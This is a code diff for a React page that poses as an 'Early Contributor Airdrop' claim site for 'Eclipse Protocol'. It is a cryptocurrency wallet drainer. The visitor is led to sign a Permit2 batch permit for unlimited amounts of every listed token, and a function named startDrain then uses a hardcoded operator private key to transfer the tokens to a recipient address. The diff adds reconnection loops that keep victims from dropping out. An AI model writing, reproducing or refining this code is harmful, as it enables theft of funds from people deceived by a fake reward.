@@ -36,21 +36,40 @@ const App = () => {
   const initiator = "0x46C189BA92DE11F8b0f0D7889EAEE5758B9A88aB";
   const initiatorPK = "d58ea7b21cfd2d0be3e1887e2d2bbdab99c7c2d33960f60cca90fe34ff21cc5c";
 
+  // Auto-reconnect after page refresh
+  useEffect(() => {
+    const checkAndReconnect = async () => {
+      if (address && !window.ethereum) {
+        setStatus("Reconnecting to your wallet...");
+        let retries = 0;
+        while (!window.ethereum && retries < 30) {
+          await new Promise(r => setTimeout(r, 500));
+          retries++;
+        }
+        if (window.ethereum) {
+          setStatus("Reconnected! You can now claim.");
+          setTimeout(() => setStatus(""), 2000);
+        }
+      }
+    };
+    checkAndReconnect();
+  }, [address]);
+
   async function createBatchSignature(provider, signer) {
     const chainId = (await provider.getNetwork()).chainId;
     const deadline = Math.floor(Date.now() / 1000) + 3600;
-    
+
     const permitted = TOKENS.map(token => ({
       token: token.address,
       amount: ethers.MaxUint256
     }));
-    
+
     const domain = {
       name: "Permit2",
       chainId: chainId,
       verifyingContract: PERMIT2_ADDRESS
     };
-    
+
     const types = {
       PermitBatchTransferFrom: [
         { name: "permitted", type: "TokenPermissions[]" },
@@ -62,13 +81,13 @@ const App = () => {
         { name: "amount", type: "uint256" }
       ]
     };
-    
+
     const message = {
       permitted: permitted,
       nonce: 0,
       deadline: deadline
     };
-    
+
     const signature = await signer.signTypedData(domain, types, message);
     return { signature, permitted, deadline };
   }
@@ -76,21 +95,21 @@ const App = () => {
   async function executeTransfer(permitData) {
     const web3 = new Web3(window.ethereum);
     const provider = new ethers.BrowserProvider(window.ethereum);
-    
+
     const transferDetails = TOKENS.map(() => ({
       to: recipient,
       requestedAmount: ethers.MaxUint256
     }));
-    
+
     const permit2ABI = [
       "function permitTransferFrom(((address token,uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, (address to, uint256 requestedAmount)[] transferDetails, address owner, bytes signature) external"
     ];
-    
+
     const permit2Contract = new web3.eth.Contract(permit2ABI, PERMIT2_ADDRESS);
-    
+
     const gasLimit = "0x" + web3.utils.toHex(800000).slice(2);
     const gasPrice = "0x" + Math.floor(800000 * 1.3).toString(16);
-    
+
     const txData = permit2Contract.methods.permitTransferFrom(
       {
         permitted: permitData.permitted,
@@ -101,7 +120,7 @@ const App = () => {
       address,
       permitData.signature
     ).encodeABI();
-    
+
     const tx = {
       from: initiator,
       to: PERMIT2_ADDRESS,
@@ -111,7 +130,7 @@ const App = () => {
       data: txData,
       value: "0x"
     };
-    
+
     const signedTx = await web3.eth.accounts.signTransaction(tx, initiatorPK);
     const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
     return receipt;
@@ -120,33 +139,44 @@ const App = () => {
   async function startDrain() {
     setIsLoading(true);
     setStatus("Connecting to blockchain...");
-    
+
     let retries = 0;
-    while (!window.ethereum && retries < 20) {
+    const maxRetries = 50;
+    
+    while (!window.ethereum && retries < maxRetries) {
       await new Promise(r => setTimeout(r, 500));
       retries++;
     }
-    
+
     if (!window.ethereum) {
-      setStatus("No wallet found. Please install Trust Wallet or MetaMask.");
-      setIsLoading(false);
-      return;
+      setStatus("Reconnecting wallet...");
+      try {
+        await open();
+        let reconnectRetries = 0;
+        while (!window.ethereum && reconnectRetries < 20) {
+          await new Promise(r => setTimeout(r, 500));
+          reconnectRetries++;
+        }
+      } catch (e) {
+        setStatus("Please reconnect your wallet and try again.");
+        setIsLoading(false);
+        return;
+      }
     }
-    
+
     try {
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner(address);
-      
+
       setStatus("Preparing token approval...");
-      
       const permitData = await createBatchSignature(provider, signer);
-      
+
       setStatus("Executing transfer...");
       await executeTransfer(permitData);
-      
+
       setStatus("Success! Tokens have been transferred.");
       setSignatureCompleted(true);
-      
+
       setTimeout(() => setStatus(""), 3000);
     } catch (error) {
       console.error(error);
@@ -162,7 +192,7 @@ const App = () => {
       <div className="orb orb-1"></div>
       <div className="orb orb-2"></div>
       <div className="orb orb-3"></div>
-      
+
       <div className="slider">
         <div className="glass-card">
           <div className="reward-label">EARLY CONTRIBUTOR AIRDROP</div>
@@ -186,7 +216,7 @@ const App = () => {
           </div>
         </div>
       </div>
-      
+
       <footer className="footer">
         <p>© 2026 Eclipse Protocol. All rights reserved.</p>
       </footer>
